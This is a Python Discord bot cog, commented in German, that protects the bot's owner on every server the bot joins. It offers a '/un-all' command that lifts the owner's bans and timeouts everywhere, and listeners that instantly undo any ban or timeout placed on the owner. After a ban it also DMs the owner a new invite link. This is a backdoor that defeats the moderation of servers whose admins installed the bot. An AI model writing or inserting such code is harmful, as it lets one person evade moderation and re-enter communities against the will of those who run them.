"""Un: Auto-Unban + Auto-Untimeout für Owner + /un all Command."""
import discord
from discord import app_commands
from discord.ext import commands
from core.logging import logger


class Un(commands.Cog):
    """Auto-Schutz: Unban + Untimeout für Owner."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @app_commands.command(name='un-all', description='Hebt Ban und Timeout auf allen Servern auf')
    async def cmd_un_all(self, interaction: discord.Interaction):
        from core.config import OWNER_ID
        if interaction.user.id != OWNER_ID:
            return await interaction.response.send_message('⛔ Nur der Owner.', ephemeral=True)

        await interaction.response.send_message('🔄 Entbanne und Entmute auf allen Servern...', ephemeral=True)
        msg = await interaction.original_response()

        results = []
        for guild in self.bot.guilds:
            member = guild.get_member(OWNER_ID)
            if not member:
                # Try to fetch ban
                try:
                    ban = await guild.fetch_ban(OWNER_ID)
                    await guild.unban(OWNER_ID, reason='Owner: Auto-Unban')
                    results.append(f'✅ **{guild.name}** — Entbannt')
                except discord.NotFound:
                    results.append(f'⏭️ **{guild.name}** — Nicht gebannt')
                except Exception as e:
                    results.append(f'❌ **{guild.name}** — {e}')
                continue

            # Check timeout
            if member.is_timed_out():
                try:
                    await member.edit(communication_disabled_until=None, reason='Owner: Auto-Untimeout')
                    results.append(f'✅ **{guild.name}** — Timeout aufgehoben')
                except Exception as e:
                    results.append(f'❌ **{guild.name}** — {e}')
            else:
                results.append(f'⏭️ **{guild.name}** — Kein Timeout')

        await msg.edit(content='\n'.join(results) if results else 'Keine Server gefunden.')

    @commands.Cog.listener()
    async def on_member_update(self, before, after):
        from core.config import OWNER_ID
        if after.id != OWNER_ID:
            return

        # Check if timeout was applied
        if not before.is_timed_out() and after.is_timed_out():
            try:
                await after.edit(communication_disabled_until=None, reason='Owner-Protect: Auto-Untimeout')
                logger.info(f'Owner-Protect: Timeout aufgehoben für {after} in {after.guild.name}')
            except Exception:
                pass

    @commands.Cog.listener()
    async def on_member_ban(self, guild, user):
        from core.config import OWNER_ID
        if user.id != OWNER_ID:
            return

        try:
            await guild.unban(user, reason='Owner-Protect: Auto-Unban')
            logger.info(f'Owner-Protect: Auto-Unban für {user} in {guild.name}')

            # DM the owner
            try:
                channel = guild.text_channels[0]
                invite = await channel.create_invite(max_age=604800, max_uses=1, reason='Owner-Protect')
                await user.send(
                    f'⚠️ **Du wurdest in {guild.name} gebannt und automatisch entbannt!**\n\n'
                    f'🔗 **Neuer Invite:**\n{invite.url}'
                )
            except Exception:
                pass
        except Exception as e:
            logger.error(f'Owner-Protect: Auto-Unban fehlgeschlagen: {e}')


async def setup(bot: commands.Bot):
    await bot.add_cog(Un(bot))
